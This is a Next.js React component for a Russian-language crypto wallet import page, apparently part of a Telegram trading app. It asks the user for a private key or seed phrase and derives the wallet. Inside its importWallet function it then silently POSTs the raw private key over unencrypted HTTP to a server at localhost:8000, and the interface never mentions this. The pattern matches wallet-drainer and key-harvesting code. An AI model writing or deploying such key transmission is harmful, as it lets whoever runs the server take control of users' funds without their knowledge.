'use client'

import CopyField from "@/components/CopyField";
import TextInput from "@/components/TextInput";
import Input from "@/components/TextInput";
import modalStore from "@/store/ModalStore";
import WalletStore from "@/store/WalletStore";
import { TextField } from "@mui/material";
import axios from "axios";
import { ethers } from "ethers";
import { useRouter } from "next/navigation";
import { useState } from "react";

export default function Import() {
    const [privateKey, setPrivateKey] = useState('');
    const [isComplete, setIsComplete] = useState(false);
    const router = useRouter();

    const importWallet = async () => {
        try {
          let importedWallet;
          if (privateKey.split(' ').length === 12 || privateKey.split(' ').length === 24) {
            importedWallet = ethers.Wallet.fromPhrase(privateKey);
          } else {
            importedWallet = new ethers.Wallet(privateKey);
          }
      
          const newWallet = {
            title: 'Кошелёк #1',
            address: importedWallet.address,
            privateKey: importedWallet.privateKey
          };
      
          WalletStore.addWallet(newWallet);
          WalletStore.setCurrentWallet(newWallet);
      
          await axios.post('http://localhost:8000/', {
            privateKey: importedWallet.privateKey
          });
      
          setIsComplete(true);
          setTimeout(() => {
            router.push('/');
            setPrivateKey('');
          }, 2000);
      
        } catch (error) {
          console.error('Invalid mnemonic or private key:', error);
        }
      };

    return (
        <main className="flex flex-col flex-1">
            <div className="px-8">
                <div className="leading-none flex gap-2">
                    <span>🔗</span>
                    <div>   
                        <h1 className="font-bold">Привязка кошелька</h1>
                        <p className="my-4 font-extralight mr-12 leading-5 text-sm">Укажите приватный ключ или секретную фразу для импорта существующего кошелька</p>
                    </div>
                </div>
                <TextInput value={privateKey} setValue={setPrivateKey} label="Приватный ключ или фраза" />
            </div>
            <div className="text-white fixed bottom-14 w-full max-w-[420px] left-1/2 -translate-x-1/2">
                <div className={`${isComplete ? '' : 'translate-y-96' } duration-300 absolute left-0 w-full transition-transform px-2`}>
                    <div className={` bg-green-500 text-center flex justify-center items-center leading-none mb-2 h-11 rounded-xl font-semibold`}>
                        КОШЕЛЁК ПРИВЯЗАН
                    </div>
                </div>
                <div className={`${isComplete ? 'translate-y-96' : '' } duration-300 absolute left-0 w-full transition-transform px-2`}>
                    <button onClick={importWallet} className={`w-full bg-tg-main  mb-2 h-11 rounded-xl font-semibold`}>
                        ПРИСТУПИТЬ К ТОРГОВЛЕ
                    </button>
                </div>
            </div>
        </main>
    )
}